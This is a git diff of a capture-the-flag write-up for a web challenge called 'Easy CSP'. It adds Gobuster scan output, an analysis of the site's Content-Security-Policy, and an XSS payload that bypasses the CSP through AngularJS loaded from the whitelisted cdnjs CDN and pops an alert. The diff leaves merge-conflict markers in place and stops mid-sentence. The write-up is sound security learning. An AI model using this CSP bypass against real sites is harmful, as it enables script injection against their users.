@@ -29,6 +29,8 @@ last_modified: 2026-02-23
 ## Reconnaissance
 ### Gobuster Scan
 ```bash
+**Gobuster-Target**:: 103.77.175.40:8222 **Scan-Output**::
+>>>>>>> b2c6949 (Date: 2026-02-23 09:36:47)
 ===============================================================
 Gobuster v3.8
 by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
@@ -48,35 +50,47 @@ Progress: 17769 / 17769 (100.00%)
 ===============================================================
 Finished
 ===============================================================
-````
+```
 
 There is a forbidden directory that might be our target.
 
+---
+### The Content-Security-Policy
 The website was a website vulnerable to XSS as the input containing HTML tags were directly pasted into the page without escaping or sanitization.
 
 ![[Pasted image 20260223090507.png]]
 
-Since the name of the challenge is **Easy CSP**, I figure I should take a look at the tr
+Since the name of the challenge is **Easy CSP**, I figure I should take a look at the traffic:
 
----
-### Web Enumeration
+![[Pasted image 20260223091133.png]]
 
-## Foothold (User)
+**Content-Security-Policy:**
+- default-src 'self': Fallback to `'self` if not mentioned in CSP
+- **script-src 'self' [https://cdnjs.cloudflare.com](https://cdnjs.cloudflare.com/):** Allow script loaded from `'self'` or from the CloudFlare CDN.
+- **style-src 'self' 'unsafe-inline' [https://fonts.googleapis.com](https://fonts.googleapis.com/):** Allow inline script and style script from `'self'`
+- font-src 'self' [https://fonts.gstatic.com](https://fonts.gstatic.com/): Font source from `'self'` 
+- **img-src 'self' data:* ** Allow image to be loaded from anywhere.
 
-**Path:** <% tp.file.cursor(1) %>
+## CSP Bypass
 
-### Step 1: Discovery
+I input the whole CSP header into https://cspbypass.com/ and got the payload:
 
-(What did you find?)
+```html
+<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.3/angular.js"></script>
+<div ng-app>
+	<img src=x ng-on-error="
+		window = $event.target.ownerDocument.defaultView;
+		window.alert(window.origin);
+	">
+</div>
+```
 
-### Step 2: Exploitation
+The input worked:
 
-(The exact payload or exploit used).
+![[Pasted image 20260223092700.png]]
 
-> [!failure] 🐇 Rabbit Hole I spent time trying to brute force SSH.
-> 
-> - **Correction:** Always check for `id_rsa` keys in web directories first.
->     
+Since `script-src` 
+>>>>>>> b2c6949 (Date: 2026-02-23 09:36:47)
 
 ---
 
